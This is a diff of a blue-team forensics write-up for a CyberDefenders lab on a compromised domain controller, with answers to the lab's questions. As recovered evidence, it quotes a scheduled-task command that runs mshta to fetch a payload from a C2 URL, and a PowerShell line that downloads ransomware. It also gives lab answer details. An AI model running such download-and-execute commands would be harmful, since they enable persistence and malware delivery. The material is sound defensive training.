@@ -6,16 +6,47 @@ slug: /3497b0eb-61a4-80fa-8cc9-f51255ed3054
 
 
 
-**Win2016x64_14393**
+---
 
 
-# Analysis {#3497b0eb61a48056be41edbcca19187e}
+[https://cyberdefenders.org/blueteam-ctf-challenges/pwneddc-fin7/](https://cyberdefenders.org/blueteam-ctf-challenges/pwneddc-fin7/)
 
 
-## RAM {#3497b0eb61a4806c872ad548b80d9ab2}
+## Scenario {#35f7b0eb61a4800bb861c7edc2a63f05}
 
 
-Phân tích ram ta có kết quả
+A corporate domain controller has been compromised, and attackers gained control over Active Directory. As a SOC analyst, investigate to uncover who was behind the attack, what happened, when and how it occurred, and why.
+
+
+Instructions:
+
+- Use **Win2016x64_14393** profile with volatility2 to analyze the memory dump
+
+We are given an EnCase (E01) file
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-807c-98cb-e9102236432f.png)
+
+
+And a memory dump
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80da-bd72-ffd176904daf.png)
+
+
+For quick triage, I used Arsenal image mounter, then employed KAPE to extract and parse all disk forensics artifacts: registry hives, event logs, NTFS artifacts,….
+
+
+I also used volatility to run initial triage plugins.
+
+
+## Basic triage {#3497b0eb61a48056be41edbcca19187e}
+
+
+### RAM {#35f7b0eb61a480a9a76ad7c8d299414f}
+
+
+By using imageinfo with vol2
 
 
 ```c++
@@ -47,13 +78,6 @@ KPCR                          : 0xffffaa00ffec3000 (CPU 3)
 ```
 
 
-Ra 8 kết quả như chọn cái đầu tiên:
-
-- **`PsActiveProcessHead`****:** Phải lớn hơn 0. (Một hệ điều hành đang sống không thể có 0 tiến trình được).
-- **`PsLoadedModuleList`****:** Phải lớn hơn 0. (Phải có các module/driver được nạp).
-- **`KernelBase`****:** Phải là `Matches MZ: True`. (Chữ MZ là chữ ký của file thực thi PE trong Windows, chứng tỏ nó đã tìm đúng lõi kernel).
-- **`KDBG owner tag check`****:** Nên là `True`.
-
 ```c++
 Offset (V)                    : 0xf8030e8f2500
 Offset (P)                    : 0x13c6f2500
@@ -61,101 +85,196 @@ KdCopyDataBlock (V)           : 0xf8030e7d2e00
 ```
 
 
-Ta có thể xài: 
-
-- `Offset (V)` : vì vol2,3 dùng địa chỉ ảo
-- `KdCopyDataBlock (V)` **Ý nghĩa:** Đây là một địa chỉ ảo (Virtual) khác, trỏ tới một **bản sao (copy)** của cấu trúc KDBG.
-	- Dùng trong tường hợp `Block encoded : Yes`, `Offset (V)` sẽ bị lỗi, và lúc đó bạn **bắt buộc** phải dùng địa chỉ `KdCopyDataBlock (V)` để Volatility đọc được dữ liệu gốc.
-
-## Disk {#3497b0eb61a480498f0ff59e42b61a99}
+And other initial triage plugins:
 
 
-### $MFT {#3497b0eb61a4806fb9fec326ba3c8412}
+psxview: we see sign of DKOM (Direct kernel object manipulation)
+
+- The attacker unlinked the malicious process from EPROCESS **`doubly-linked list`**`.`
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-806f-a0f8-d48727ef87e5.png)
 
 
-| Created0x10<br/>2016-07-16 14:08:43            | Created0x30<br/>2021-11-20 01:33:37            |   |
-| ---------------------------------------------- | ---------------------------------------------- | - |
-| Last Modified0x10<br/>2016-07-16 14:08:43      | Last Modified0x30<br/>2021-11-20 01:33:37      |   |
-| Last Record Change0x10<br/>2021-11-24 05:28:22 | Last Record Change0x30<br/>2021-11-20 01:33:37 |   |
-| Last Access0x10<br/>2016-07-16 14:08:43        | Last Access0x30<br/>2021-11-20 01:33:37        |   |
+pstree:
 
 
-Ta tìm được một mớ file exe và dll 
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8045-8957-f5d4eb1def44.png)
 
 
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-80c4-89b5-da5cfe8e32b6.png)
+A legitimate svchost.exe is typically spawned by services.exe.
 
 
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-804d-983c-d7866fdb2188.png)
+`wsmprovhost.exe` (Windows Management Instrumentation Shell Provider Host) is a legitimate Windows process responsible for handling **Windows Remote Management (WinRM)** and **PowerShell remoting** tasks. It is not designed to act as a parent process of system services
 
 
-| Entry Number<br/>87220  | Parent Entry Number<br/>87213  | .\Users\administrator\AppData\Local\Temp\DismHost.exe	.exe	 |
-| ----------------------- | ------------------------------ | ----------------------------------------------------------- |
-| Entry Number<br/>108972 | Parent Entry Number<br/>108970 | File Name<br/>vcredist_x86.exe                              |
-|                         |                                |                                                             |
+Also `explorer.exe` should be spawned by `userinit.exe` not `svchost.exe`
 
 
-.\Users\administrator\AppData\Local\Temp\DismHost.exe	.exe	
+netscan
 
 
-### Prefetch {#3497b0eb61a4809692a8ef59e7128380}
-
-- 
-
-| Run Time<br/>2021-11-23 13:20:12                                                                                                                                                                                                                                                                                                 | **`MIMIKATZ.EXE-E60D5C29.pf`**:                                                                                                                                                                                                                           | `Executable Name<br/>\VOLUME{01d7ddaea1605655-d6a188f8}\USERS\LABIB\DOCUMENTS\MIMIKATZ.EXE`   |
-| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
-| Run Time<br/>2021-11-22 21:51:34                                                                                                                                                                                                                                                                                                 | **`SHARPHOUND.EXE-F1A89354.pf`**: Đây là bộ thu thập dữ liệu của BloodHound. Attacker dùng nó để lập bản đồ toàn bộ mạng Active Directory (PwnedDC), tìm kiếm các đường dẫn leo thang đặc quyền (Privilege Escalation paths) nhanh nhất đến Domain Admin. | `Executable Name<br/>\VOLUME{01d7ddaea1605655-d6a188f8}\USERS\LABIB\DOWNLOADS\SHARPHOUND.EXE` |
-| Run Time<br/>2021-11-22 22:29:47<br/>2021-11-22 22:30:31<br/>2021-11-22 22:30:48<br/>2021-11-22 22:33:56<br/>2021-11-22 22:38:30<br/>2021-11-22 22:40:55<br/>2021-11-22 22:43:10<br/>2021-11-22 22:54:56                                                                                                                         | **`PSEXEC64.EXE-71EB8A0A.pf`**:                                                                                                                                                                                                                           | `Executable Name<br/>\VOLUME{01d7ddaea1605655-d6a188f8}\USERS\LABIB\DOWNLOADS\PSEXEC64.EXE`   |
-| Run Time<br/>2021-11-22 20:41:19<br/>2021-11-22 20:43:27<br/>2021-11-22 21:02:36<br/>2021-11-22 21:49:54<br/>2021-11-22 22:43:51<br/>2021-11-23 12:46:14<br/>2021-11-23 13:18:25<br/>2021-11-23 13:30:04                                                                                                                         | **`POWERSHELL.EXE-022A1004.pf`**: Rất có thể đây chính là tiến trình đã chạy lệnh `fsutil` hoặc các script để xóa `$UsnJrnl` và `$LogFile` mà bạn đang điều tra ở bước trước.                                                                             |                                                                                               |
-| Run Time<br/>2021-11-23 13:32:44                                                                                                                                                                                                                                                                                                 | **`SCHTASKS.EXE-BA1E321E.pf`**: Dấu hiệu của việc thiết lập Persistence (Cơ chế kiên trì) thông qua Scheduled Tasks, hoặc dùng để thực thi payload dưới quyền System.                                                                                     |                                                                                               |
-| Run Time<br/>2021-11-20 18:32:40<br/>2021-11-21 09:21:33<br/>2021-11-21 15:50:05<br/>2021-11-21 23:02:10<br/>2021-11-21 23:09:41<br/>2021-11-22 19:20:26<br/>2021-11-22 19:26:29<br/>2021-11-22 19:33:43<br/>2021-11-22 19:40:45<br/>2021-11-22 20:42:23<br/>2021-11-23 13:12:53<br/>2021-11-23 13:18:16<br/>2021-11-23 22:53:39 | **`RUNDLL32.EXE`** **(nhiều file) &** **`REGSVR32.EXE-E1DBB6D8.pf`**: Thường được dùng để thực thi các malicious DLLs lén lút (ví dụ như payload của Cobalt Strike - một công cụ FIN7 rất hay dùng) hoặc bypass AppLocker qua kỹ thuật Squiblydoo.        |                                                                                               |
-| Run Time<br/>2021-11-22 22:44:17                                                                                                                                                                                                                                                                                                 | **`WHOAMI.EXE-824687C3.pf`**: Kiểm tra user hiện tại và các đặc quyền.                                                                                                                                                                                    |                                                                                               |
-| Run Time<br/>2021-11-21 09:18:07<br/>2021-11-21 15:49:21<br/>2021-11-21 18:57:05<br/>2021-11-21 22:26:38<br/>2021-11-21 23:11:14<br/>2021-11-22 18:28:30<br/>2021-11-22 18:56:44<br/>2021-11-22 20:30:57                                                                                                                         | **`IPCONFIG.EXE-EEA91845.pf`** **&** **`PING.EXE-167FE968.pf`**: Kiểm tra cấu hình mạng và quét các target lân cận.                                                                                                                                       |                                                                                               |
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8000-b9a0-d3482716d9ac.png)
 
 
-### AmCache {#3497b0eb61a480b7ad5ee5454a5fb409}
-
-- `c:\users\labib\...`
-- `c:\users\administrator\...`
-- `c:\users\jinan.s\...`
-
-### ShimCache {#3497b0eb61a480d796b6e068fcba1f7c}
+192.168.112.139 is listening at port 5985 (WinRM) and is connecting to 192.168.112.142 consolidates our finding above.
 
 
-## User {#3497b0eb61a480cda6aff79bccbe030a}
+> Attacker (having already compromised 192.168.112.142 ) established a WinRM session to 192.168.112.139 (lateral movement)
 
 
-### Labib {#3497b0eb61a4801589c8ceeda14ea6bd}
+### Disk {#3497b0eb61a480498f0ff59e42b61a99}
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-809b-91ed-c56455059775.png)
+
+
+MFT table: somehow all the entries were named with strings of z
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-805f-ae39-e9a2a086c2d8.png)
+
+
+Same thing happened with UsnJr
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80da-9e16-cfe20ec32a01.png)
+
+
+:::tip
+
+This is a classic forensic signature of anti-forensics secure deletion.
+- Data wiping: overwrite the physical sectors on the hard drive with random data, ensuring the file’s content cannot be carved or recovered
+
+- MFT name wiping: using SDelete to rename the file 26 times.
+
+It starts by renaming the file to all `A`s, then renames it to all `B`s, then all `C`s, cycling through the entire alphabet until it reaches `Z`.
+
+- _Example:_ If the attacker deletes `malware.exe` (11 characters), SDelete renames it to `AAAAAAA.AAA`, then `BBBBBBB.BBB`, all the way to `ZZZZZZZ.ZZZ`, and _then_ finally issues the deletion command.
+
+:::
+
+
+
+
+I took a look at the Prefetch:
+
+
+| Run Time<br/>2021-11-23 13:20:12                                                                                                                                                                                                                                                                                                 | **`MIMIKATZ.EXE-E60D5C29.pf`**:                                                                                                               | `Executable Name<br/>\VOLUME{01d7ddaea1605655-d6a188f8}\USERS\LABIB\DOCUMENTS\MIMIKATZ.EXE`                                           |
+| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
+| Run Time<br/>2021-11-22 21:51:34                                                                                                                                                                                                                                                                                                 | **`SHARPHOUND.EXE-F1A89354.pf`**: data collector for BloodHound. Attacker use for mapping Active Directory (PwnedDC) and privilege escalation | `Executable Name<br/>\VOLUME{01d7ddaea1605655-d6a188f8}\USERS\LABIB\DOWNLOADS\SHARPHOUND.EXE`                                         |
+| Run Time<br/>2021-11-22 22:29:47<br/>2021-11-22 22:30:31<br/>2021-11-22 22:30:48<br/>2021-11-22 22:33:56<br/>2021-11-22 22:38:30<br/>2021-11-22 22:40:55<br/>2021-11-22 22:43:10<br/>2021-11-22 22:54:56                                                                                                                         | **`PSEXEC64.EXE-71EB8A0A.pf`**: notoriously known to be used in lateral movement                                                              | `Executable Name<br/>\VOLUME{01d7ddaea1605655-d6a188f8}\USERS\LABIB\DOWNLOADS\PSEXEC64.EXE`                                           |
+| Run Time<br/>2021-11-22 20:41:19<br/>2021-11-22 20:43:27<br/>2021-11-22 21:02:36<br/>2021-11-22 21:49:54<br/>2021-11-22 22:43:51<br/>2021-11-23 12:46:14<br/>2021-11-23 13:18:25<br/>2021-11-23 13:30:04                                                                                                                         | **`POWERSHELL.EXE-022A1004.pf`**:                                                                                                             |                                                                                                                                       |
+| Run Time<br/>2021-11-23 13:32:44                                                                                                                                                                                                                                                                                                 | **`SCHTASKS.EXE-BA1E321E.pf`**: can be used to create the scheduled task we have found above                                                  | `\VOLUME{01d7ddaea1605655-d6a188f8}\WINDOWS\SYSTEM32\SCHTASKS.EXE`                                                                    |
+| Run Time<br/>2021-11-20 18:32:40<br/>2021-11-21 09:21:33<br/>2021-11-21 15:50:05<br/>2021-11-21 23:02:10<br/>2021-11-21 23:09:41<br/>2021-11-22 19:20:26<br/>2021-11-22 19:26:29<br/>2021-11-22 19:33:43<br/>2021-11-22 19:40:45<br/>2021-11-22 20:42:23<br/>2021-11-23 13:12:53<br/>2021-11-23 13:18:16<br/>2021-11-23 22:53:39 | **`RUNDLL32.EXE`** **:** LOLBIN to execute dll files or credential access.                                                                    | `\VOLUME{01d7ddaea1605655-d6a188f8}\WINDOWS\SYSWOW64\RUNDLL32.EXE`<br/>`\VOLUME{01d7ddaea1605655-d6a188f8}\WINDOWS\SYSTEM32\RUNDLL32.EXE` |
+| Run Time<br/>2021-11-22 22:44:17                                                                                                                                                                                                                                                                                                 | **`WHOAMI.EXE-824687C3.pf`**: discovery                                                                                                       |                                                                                                                                       |
+| Run Time<br/>2021-11-21 09:18:07<br/>2021-11-21 15:49:21<br/>2021-11-21 18:57:05<br/>2021-11-21 22:26:38<br/>2021-11-21 23:11:14<br/>2021-11-22 18:28:30<br/>2021-11-22 18:56:44<br/>2021-11-22 20:30:57                                                                                                                         | **`IPCONFIG.EXE-EEA91845.pf`** **`PING.EXE-167FE968.pf`**: discovery                                                                          |                                                                                                                                       |
+
+
+### User related action {#3497b0eb61a480cda6aff79bccbe030a}
+
+
+Because the Prefetch artifacts indicated that the user Labib executed Mimikatz and SharpHound, I checked his recent activity in `NTUSER.DAT`."
 
 
 | Target Name                   | Lnk Name                      | Mru Position | Opened On           |
 | ----------------------------- | ----------------------------- | ------------ | ------------------- |
 | Outlook.pst                   | Outlook.lnk                   | 0            | 2021-11-21 23:09:55 |
 | 20211119103954_BloodHound.zip | 20211119103954_BloodHound.lnk | 0            | 2021-11-19 18:40:16 |
-|                               |                               |              |                     |
-|                               |                               |              |                     |
 
 
 ![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-8034-8646-cdb899213587.png)
 
 
+And UserAssist
 
-bạn có thể thấy `Outlook.pst` và `Employee.xlsx` được mở vào các khung giờ rất sát nhau (23:09 và 19:39 ngày 21/11/2021). File `Employee.xlsx` này có khả năng rất cao chính là payload hoặc mồi nhử mà attacker đã gửi đi.
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8007-ba2b-c5d0463dcf41.png)
 
 
+The session spanned for almost 3 hours and powershell window was opened for more than one hour in 23-11-2021
+
+
+JumpLists
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8042-8343-dc05da9bd125.png)
+
+
+ShellBags
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80b6-8976-f9b7d34e6980.png)
+
+
+The compromised user accessed BloodHound.zip on 19/11/2021 at 18:40:00
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80f7-bbe3-d04f794a62ce.png)
+
+
+ \DC01\netlogon was last openned at 19/11/2021 19:40:49
+
+
+\DC01\Dc01\sysvol was last accessed at 2021-11-22 22:49:39.863
+
+
+
+Administrator:
+
+
+I search for `ConsoleHost_history.txt` . Only user Administrator had this file: 
+
+
+```powershell
+.\schtasks.exe /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR "c:\Windows\system32\cmd.exe /c 'mshta.exe http://c2.cyberdefenders.org/5EEiDSd70ET0k.hta'"
+
+```
+
+
+A scheduled task which connect to c2.cyberdefenders.org and download a suspicious file
 
 
 ### EventID {#3497b0eb61a480dab7e3d9ba399c8f37}
 
 
-Không tìm thấy gì nhiều
+By using evtxEcmd.exe 
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80d9-9853-e4dbc7652073.png)
+
+
+There are no Sysmon logs on the machine. And other event log seemed to be wiped
+
+
+:::tip
+
+From all the analysis above, we can deduce several conclusions:
+- Anti-forensics and defense evasion: the attacker attempted to cover their tracks by deleting windows event logs, destroyed malicious payloads and staged data by using file-wiping utility (could be Sysinternal SDelete)
+
+- DKOM: unlink the malicious processes from EPROCESS list.
+
+- AD reconnaissance and credential theft: Prefetch files and the NTUSER.DAT registry hive confirm that the compromised user (Labib) executed MIMIKATZ.EXE, SHARPHOUND.exe and interacted with BLOODHOUND.zip
+
+- Lateral movement: network connections show that attacker compromised 192.168.112.142 and established a WinRM session to pivot to 192.168.112.142. ShellBags and Prefetch artifacts further confirm the use of PSEXEC64.exe and unauthorized access to critical DC shares (`\\DC01\netlogon` and `\\DC01\sysvol`).
+
+- Persistence: console history artifacts revealed the creation of a daily scheduled task named MicrosoftEdge. This task uses mshta.exe to reach out to attacker’s infrastructure `http://c2.cyberdefenders.org/5EEiDSd70ET0k.hta`  to retrieve the payload.
+
+:::
+
+
+
+
+## Questions {#35f7b0eb61a48046ae14e26ed730e7ed}
 
 
 ### Q1 What is the name of the first malware detected by Windows Defender? {#3497b0eb61a480d49c0ff09851b1ef71}
 
 
-Exploit:Win32/ShellCode.BN
+By checking for event ID 1116: 
 
+
+```sql
+Exploit:Win32/ShellCode.BN
 
 Type :		Warning
 Date :		11/21/2021
@@ -164,56 +283,82 @@ Event :		1116
 Computer :	PC01.cyberdefenders.org
 : file:_\\vmware-host\Shared Folders\asd\note.txt
 
-
 Process Name: C:\Windows\System32\notepad.exe
-
-
-Q2 Provide the date and time when the attacker clicked send (submitted) the malicious email?
-
-
-Ta tìm thấy file pst ở
-
-
-`C:\Users\<Username>\Documents\Outlook Files\`pst ở
-
-
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-80df-8c10-c306fb4e2694.png)
-
-
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-8014-a663-d4d60442458f.png)
-
-
-From: "DHL FINANCE INQUIRY " [ismail@dxmxva.buzz](mailto:ismail@dxmxva.buzz)
-Date: Thu, 12 Aug 2021 06:47:48 +0200 
-
-
-Ta phải trừ đi 2 tiếng: 2021-08-12 04:47
-
-
-Tiếp tục dùng olevba để phát hiện bên trong có macros gì
-
-
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-80a6-a209-ec7efc57773f.png)
-
-
-Đoạn VBA dịch ra thì chỉ là Hello world mà thôi
-
-
-phải dùng pcode
-
-
-```c++
-olevba --show-pcode "Unpaid Invoice.xls" > pcode_analysis.txt
 ```
 
 
-Ta thấy payload như sau:
+> Exploit:Win32/ShellCode.BN
 
 
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.3497b0eb-61a4-809b-9551-ff95072fd10d.png)
+### Q2 Provide the date and time when the attacker clicked send (submitted) the malicious email? {#3497b0eb61a480db9655fda53033f3e4}
 
 
-Ta dùng một script
+In corporate evinronment, Outlook is a popular email client. By navigating to`C:\Users\<Username>\Documents\Outlook Files\` , i found .pst file
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-802a-bc79-d591a923112e.png)
+
+
+By using typical outlook forensics tool provided in the lab, in this case 4n6 Outlook wizard.
+
+
+There are a 73 emails in the inbox. I skimmed through the emails with attachments and noticed an abnormal attachment: 
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-805f-a5c3-d9779e14de41.png)
+
+
+I calculated the hash and checked on virustotal
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80d4-b4e7-cf0690895836.png)
+
+
+Skimming through the email’s source code
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8006-8326-ff21f618fb68.png)
+
+
+From: "DHL FINANCE INQUIRY " ismail@dxmxva.buzz
+Date: Thu, 12 Aug 2021 06:47:48 +0200 
+
+
+The question asks for UTC time. So the answer is:
+
+
+> `2021-08-12 04:47`
+
+
+### Q3 What is the IP address and port on which the attacker received the reverse shell? {#3497b0eb61a480a388d8c4a14a97b5da}
+
+
+I use olevba to check if there was any malicious VBA in the xls file.
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8079-a2c2-ea2e7da0320f.png)
+
+
+To actually understand the behavior of the VBA: 
+
+
+```c++
+olevba --show-pcode "Unpaid Invoice.xls" > pcode.txt
+```
+
+
+The payload:
+
+
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8022-952a-e72a98b667bb.png)
+
+
+`LitDI2` is a specific instruction found in VBA P-code (the compiled, intermediate language that Microsoft Office actually executes when running a macro).
+
+- Lit (Literal): This indicates that the instruction is dealing with a "literal" value—a fixed, hardcoded number written directly into the code, rather than a variable.
+- I2 (2-byte Integer): This specifies the data type and size. It tells the system to expect a 16-bit (2-byte) signed integer.
+
+I used a python script to extract the shellcode: 
 
 
 ```c++
@@ -225,11 +370,14 @@ with open("pcode.txt", "r") as file:
     shellcode = bytearray()
     for h in hex_strings:
         val=int(h,16)
-        shellcode.append(val & 0xFF)
+        shellcode.append(val & 0xFF) #bitwise
     with open('payload.bin', "wb") as f:
         f.write(shellcode)
     
 ```
+
+
+And used the scdbg to analyze the shellcode’s behavior
 
 
 ```c++
@@ -250,35 +398,40 @@ Stepcount 2000001
 ```
 
 
-### Q3 What is the IP address and port on which the attacker received the reverse shell? {#3497b0eb61a480a388d8c4a14a97b5da}
-
-
-server: 192.168.112.128, port: 8080, )
+> server: 192.168.112.128, port: 8080
 
 
 ### Q4 What is the MITRE ID of the technique used by the attacker to achieve persistence? {#3497b0eb61a480589614fe8628b21fec}
 
 
-Đi tìm nội dung ở consoleHost 
+We already found  `ConsoleHost_history.txt` file in `D:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline`
 
 
-`ConsoleHost_history.txt` file in `D:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline`
-
-
+```sql
 "C:\Windows\system32\schtasks.exe" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR "c:\Windows\system32\cmd.exe /c 'mshta.exe http://c2.cyberdefenders.org/5EEiDSd70ET0k.hta'"
 .\schtasks.exe /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR "c:\Windows\system32\cmd.exe /c 'mshta.exe http://c2.cyberdefenders.org/5EEiDSd70ET0k.hta'"
+```
 
 
-**T1053.005** 
+> T1053. 005 — Scheduled Task
 
 
 ### Q5 What is the attacker's C2 domain name? {#3497b0eb61a480cc9b2bf22d430b3305}
 
 
+> 192.168.112.128
+
+
 ### Q6 What is the name of the tool used by the attacker to collect AD information? {#3497b0eb61a48013bd75fffc350c40b5}
 
 
-BloodHound
+As we have found proof in Prefetch and Labib’s NTuser.dat.
+
+
+The result must be:
+
+
+> BloodHound
 
 
 ### Q7 What is the PID of the malicious process? {#3497b0eb61a480628a18f5abbc6e6a9d}
@@ -288,47 +441,45 @@ BloodHound
 .... 0xffffba03419b7800:svchost.exe                  3140   1632      5      0 2021-11-20 15:06:52 UTC+0000
 
 
-  cmd: "C:\Users\Administrator\Documents\svchost.exe”
+As we have analyzed before. The answer must be:
 
 
-svchost phải do services sinh ra
-
-
-.. 0xffffba033ee98800:svchost.exe             356    664      41      0 2021-11-20 14:12:24 UTC+0000
-... 0xffffba0341887800:explorer.exe          2940    356      50      0 2021-11-20 14:20:11 UTC+0000
-
-
-explorer phải do thằng userinit.exe sinh ra
+> 3140
 
 
 ### Q8 What is the family of ransomware? {#3497b0eb61a48069892fd8a14532b4ed}
 
 
-`vol.exe -f "C:\Users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\memory.dmp" --profile=Win2016x64_14393 -g 0xf8030e8f2500 procdump -D "C:\Users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\processes”`
+Since I used the `malfind` plugin and couldn't find an address segment with the `MZ` magic bytes, the attacker must have employed process hollowing or masquerading
 
 
-vol.exe -f "C:\users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\memmory.dmp" --profile=Win2016x64_14393 -g 0x0000000022e48800 memdump -D "C:\users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\memdump”
+I used the procdump plugin
 
 
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.34a7b0eb-61a4-8063-9909-c8f52f591ba7.png)
+```sql
+C:\Users\Administrator\Desktop\Start Here\Artifacts\AD-MEM>vol.exe -f memory.dmp --profile=Win2016x64_14393 -g 0xf8030e8f2500 procdump -p 3140 -D .         
+```
 
 
-Sau đó dùng clamscan check hoặc tính hash
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-8043-958e-e7f1718870f5.png)
+
+
+I calculated the hash and upload to virustotal
 
 
 ![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.34a7b0eb-61a4-8059-aee8-f96520bd0652.png)
 
 
-![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.34a7b0eb-61a4-80eb-9142-f68a646463b4.png)
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80b4-8ec0-df0e95ae632f.png)
 
 
-C:\Users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\processes\executable.3140.exe: Win.Packed.DarkSide-9262656-0 FOUND
-
-
-Darkside
+> Darkside
 
 
 ### Q9 What is the command invoked by the attacker to download the ransomware? {#3497b0eb61a480fba36edc1496e4fcd2}
+
+
+I dumped the malicious process using memdump
 
 
 ```c++
@@ -342,25 +493,22 @@ strings.exe -n 10 3140.dmp | Select-String -Pattern "192.168.112.128:8000" -Cont
 ![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.34a7b0eb-61a4-80f2-87f1-c3df0e22be26.png)
 
 
-Invoke-WebRequest http://192.168.112.128:8000/svchost.exe -OutFile svchost.exe
+> `Invoke-WebRequest http://192.168.112.128:8000/svchost.exe -OutFile svchost.exe`
 
 
 ### Q10 What is the address where the ransomware stores the 567-byte key under the malicious process's memory? {#3497b0eb61a4809f861ffb6c2a7201f4}
 
 
-Trước hết ta dùng strings -n 567 3140.dmp
+To solve this question i use the -n flag in strings.exe to find string length ≥ 567 
 
 
-cho tôi những chuỗi ký tự nào dính liền nhau và dài đúng bằng hoặc hơn 567 ký tự
+![](./3497b0eb-61a4-80fa-8cc9-f51255ed3054.35f7b0eb-61a4-80fa-aa40-cf2f988afda9.png)
 
 
-lsJTyyTnzJlGQ1I6sfwV6oVcXaRynwN6mWphA7BKXEDIHJcDlhNNHsrxlkpggRChK2nQ7wP0sknJvl37lbqElTopkUywK3QnfJFmqDBSCmFISeWSudjgwxB4kKSp7h4VySHeu4LmDiZXTAh1dbZHWxTtZ0bA6PhCoDrbGkctY4rucITW4IdYUZJC8d2B7SFnr5EA7EoRkajrZW54brM5Kgwqsz67qzH6Hk0Vr3EDcnGzNjGQBapJczIWkgPtMCJdTkeemQ34XH7wawXu3eOGV3uJlBZNoSuaxtDHMGApS8EWsUXhafMW8WxFLAPLCo6pdm7MLcLsVDp9iBXU1sLv2KkGyUJbO0KOmom9f1JREuidviHRfsndEgMFBAjyq5v4VEIraiioAbtWM7eecYaXPVt3rolsBi8mtjxLOpFj73NPPitoIDxBNfHGzXxvRTXi06Pjx9pRnAtjIqoq5wovnHa8uBel8nq8yDJTk7NWdGdsv3yVwV2TmBin7OvFqHN9lweFNJyuziKCVGEtSaglUNudMmpFnNObGlhfh58jQsrQiQZ2d3AOFsi
+Yarascan is excellent to find the address of any given data.
 
 
-Sau đó dùng yara scan để phát hiện ra
-
-
-`vol.exe -f "C:\users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\memory.dmp" --profile=Win2016x64_14393 -g 0xf8030e8f2500 yarascan -p 3140 -Y "lsJTyyTnzJlGQ”` để tìm được vị trí `0x00b5f4a5`
+`vol.exe -f "C:\users\Administrator\Desktop\Start Here\Artifacts\AD-MEM\memory.dmp" --profile=Win2016x64_14393 -g 0xf8030e8f2500 yarascan -p 3140 -Y "lsJTyyTnzJlGQ”` 
 
 
 ```c++
@@ -387,7 +535,13 @@ Owner: Process svchost.exe Pid 3140
 ```
 
 
+> 0x00b5f4a5  
+
+
 ### Q11 What is the 8-byte word hidden in the ransomware process's memory? {#3497b0eb61a48087a5acc44ab2db4de5}
+
+
+This time we will use volshell
 
 
 ```c++
@@ -411,70 +565,91 @@ To get help, type 'hh()'
 >>>
 ```
 
-- Lệnh `proc().Peb.ProcessHeaps.dereference()` là bạn đang ra lệnh cho Windows: _"Hãy mở cấu trúc PEB (Process Environment Block) của mã độc này ra, tìm cho tôi vùng nhớ Heap (vùng nhớ động) của nó"_.
-- Hệ thống trả về `65536` (Đổi sang hệ Hex chính là `0x10000`).
-- Lệnh `db(65536)` (Display Bytes) sẽ in dữ liệu tại địa chỉ đó ra màn hình. Và hacker đã giấu cái từ khóa 8-byte kia ngay tại điểm xuất phát (`0x10000`) của vùng nhớ Heap.
-- Không thể chạy trên 3140.dmp vì volshell cần bản đồ toàn bộ hệ điều hành tương tự YARAscan.
 
-**`c0n6r475`**
+ `proc().Peb.ProcessHeaps.dereference()` : open PEB and access the heap.
 
+
